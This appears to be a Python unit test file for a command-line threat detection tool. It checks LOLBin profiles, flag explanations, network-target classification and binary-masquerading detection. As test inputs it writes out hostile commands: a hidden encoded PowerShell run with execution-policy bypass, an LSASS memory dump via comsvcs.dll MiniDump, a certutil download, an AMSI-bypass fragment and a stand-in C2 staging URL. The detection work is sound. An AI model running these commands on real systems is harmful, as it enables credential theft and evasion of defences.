"""Tests for Domain Knowledge Base (LOLBins, flags, network classification, and masquerading)."""

from __future__ import annotations

import unittest

from cmd_unmask.knowledge import (
    LOLBIN_PROFILES,
    classify_network_target,
    detect_binary_masquerading,
    explain_execution_flags,
    lookup_binary_profile,
)
from cmd_unmask.models import Severity
from cmd_unmask.unpacker import unmask_command


class TestKnowledgeBaseModule(unittest.TestCase):
    """Verify LOLBin profiles, execution flag semantics, and network target classification."""

    def test_lolbin_catalog_has_40_plus_profiles_and_lookup(self) -> None:
        self.assertGreaterEqual(len(LOLBIN_PROFILES), 40)

        cert = lookup_binary_profile(r"C:\Windows\System32\certutil.exe")
        self.assertIsNotNone(cert)
        self.assertEqual(cert.name, "certutil.exe")
        self.assertIn("T1105", cert.mitre_ids)

        curl_prof = lookup_binary_profile("/usr/bin/curl")
        self.assertIsNotNone(curl_prof)
        self.assertEqual(curl_prof.name, "curl")
        self.assertEqual(curl_prof.platform, "linux")

        self.assertIsNone(lookup_binary_profile("totally_unknown_custom_app.exe"))

    def test_execution_flag_semantics_lookup(self) -> None:
        cmd = (
            "powershell.exe -NoP -W Hidden -ep bypass -enc SQBFAFgA "
            "; rundll32.exe comsvcs.dll, MiniDump 624 C:\\Temp\\lsass.dmp full"
        )
        explanations = explain_execution_flags(cmd)
        joined = "\n".join(explanations)
        self.assertIn("-NoP", joined)
        self.assertIn("Hidden", joined)
        self.assertIn("bypass", joined.lower())
        self.assertIn("comsvcs.dll", joined)
        self.assertIn("MiniDump", joined)

        amsi_exp = explain_execution_flags("certutil -urlcache -split -f http://x/y; [Ref].Assembly...amsiInitFailed")
        amsi_joined = "\n".join(amsi_exp)
        self.assertIn("-urlcache", amsi_joined)
        self.assertIn("amsiInitFailed", amsi_joined)

    def test_classify_network_target_all_categories(self) -> None:
        self.assertEqual(classify_network_target("10.10.5.20", "ipv4"), "private_rfc1918")
        self.assertEqual(classify_network_target("172.16.0.5", "ipv4"), "private_rfc1918")
        self.assertEqual(classify_network_target("192.168.1.10", "ipv4"), "private_rfc1918")
        self.assertEqual(classify_network_target("127.0.0.1", "ipv4"), "loopback")
        self.assertEqual(classify_network_target("169.254.169.254", "ipv4"), "cloud_metadata")
        self.assertEqual(
            classify_network_target("http://169.254.169.254/latest/meta-data/", "url"),
            "cloud_metadata",
        )
        self.assertEqual(
            classify_network_target("metadata.google.internal", "domain"),
            "cloud_metadata",
        )
        self.assertEqual(classify_network_target("learn.microsoft.com", "domain"), "trusted_vendor")
        self.assertEqual(classify_network_target("powershellgallery.com", "domain"), "trusted_vendor")
        self.assertEqual(
            classify_network_target("https://github.com/org/repo", "url"),
            "trusted_vendor",
        )
        self.assertEqual(classify_network_target("198.51.100.42", "ipv4"), "public_external")
        self.assertEqual(
            classify_network_target("http://c2.evil.example:8080/stage.ps1", "url"),
            "public_external",
        )
        self.assertEqual(classify_network_target("c2.evil.example", "domain"), "public_external")


class TestBinaryMasqueradingDetection(unittest.TestCase):
    """Verify T1036.005 binary masquerading detection and benign counter-examples."""

    def test_masquerading_unit_detection_positive_and_negative(self) -> None:
        self.assertIsNotNone(detect_binary_masquerading(r"C:\Users\Public\svchost.exe"))
        self.assertIsNotNone(detect_binary_masquerading("/tmp/sshd"))
        self.assertIsNotNone(detect_binary_masquerading(r"C:\ProgramData\lsass.exe"))

        self.assertIsNone(detect_binary_masquerading(r"C:\Windows\System32\svchost.exe"))
        self.assertIsNone(detect_binary_masquerading(r"C:\Windows\SysWOW64\rundll32.exe"))
        self.assertIsNone(detect_binary_masquerading("/usr/bin/sudo"))
        self.assertIsNone(detect_binary_masquerading("/bin/sh"))
        self.assertIsNone(detect_binary_masquerading("svchost.exe"))

    def test_classifier_flags_masquerading_t1036_005(self) -> None:
        verdict = unmask_command(
            "svchost.exe -k netsvcs",
            source_id="masq-1",
            image=r"C:\Users\Public\svchost.exe",
        )
        self.assertNotEqual(verdict.severity, Severity.BENIGN)
        self.assertIn("T1036.005", [m.mitre_id for m in verdict.behavioral_matches])
        self.assertIn("BINARY_MASQUERADING", [m.rule_id for m in verdict.behavioral_matches])

    def test_classifier_benign_counter_examples_do_not_trigger_masquerading(self) -> None:
        cases = (
            ("svchost.exe -k netsvcs", r"C:\Windows\System32\svchost.exe"),
            ("sudo id", "/usr/bin/sudo"),
            ("svchost.exe -k netsvcs", None),
        )
        for cmd, img in cases:
            verdict = unmask_command(cmd, source_id="masq-ben", image=img)
            self.assertEqual(verdict.severity, Severity.BENIGN)
            self.assertNotIn("BINARY_MASQUERADING", [m.rule_id for m in verdict.behavioral_matches])


if __name__ == "__main__":
    unittest.main()
